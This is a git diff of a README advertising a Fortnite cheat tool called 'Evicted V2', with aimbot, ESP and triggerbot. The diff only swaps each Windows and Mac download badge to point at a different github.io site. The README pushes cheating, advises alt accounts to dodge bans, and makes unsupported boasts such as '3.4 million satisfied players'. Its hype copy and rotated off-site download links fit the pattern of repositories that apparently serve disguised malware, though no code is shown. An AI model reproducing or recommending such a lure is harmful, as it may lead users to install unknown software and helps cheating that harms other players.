@@ -10,8 +10,8 @@ The **🛡️ Fortnite External Evicted V2** is the most trusted and reliable ex
 
 <div align="center">
 
-[![Download Fortnite External Evicted V2](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://laplaplaplas.github.io/mac-download/)
+[![Download Fortnite External Evicted V2](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://beatowlrouse.github.io/windownload/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://beatowlrouse.github.io/macdownload/)
 
 </div>
 
@@ -145,7 +145,7 @@ The **🛡️ Fortnite External Evicted V2** stands apart from competitors throu
 7. **⚡ Enable features** - Toggle aimbot, ESP, and triggerbot
 8. **🏆 Dominate** - Let the external tools enhance your gameplay
 
-[![Download Fortnite External Evicted V2](https://img.shields.io/badge/🔻%20DOWNLOAD%20EVICTED%20V2%20🔻-purple?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
+[![Download Fortnite External Evicted V2](https://img.shields.io/badge/🔻%20DOWNLOAD%20EVICTED%20V2%20🔻-purple?style=for-the-badge&logo=github)](https://beatowlrouse.github.io/windownload/)
 
 ### Menu Controls
 
@@ -165,7 +165,7 @@ The **🛡️ Fortnite External Evicted V2** stands apart from competitors throu
 
 <div align="center">
 
-[![Download for Mac](https://img.shields.io/badge/⬇️%20DOWNLOAD%20FOR%20MAC-black?style=for-the-badge&logo=apple)](https://laplaplaplas.github.io/mac-download/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20DOWNLOAD%20FOR%20MAC-black?style=for-the-badge&logo=apple)](https://beatowlrouse.github.io/macdownload/)
 
 </div>
 
@@ -232,5 +232,5 @@ External operation is significantly safer than internal injection. Use alt accou
 
 The **🛡️ Fortnite External Evicted V2** represents the pinnacle of external cheating technology for Fortnite in 2026. Join over 3.4 million satisfied players who've transformed their gameplay.
 
-[![Download Fortnite External Evicted V2](https://img.shields.io/badge/🔻%20DOWNLOAD%20EVICTED%20V2%20🔻-purple?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://laplaplaplas.github.io/mac-download/)
+[![Download Fortnite External Evicted V2](https://img.shields.io/badge/🔻%20DOWNLOAD%20EVICTED%20V2%20🔻-purple?style=for-the-badge&logo=github)](https://beatowlrouse.github.io/windownload/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://beatowlrouse.github.io/macdownload/)
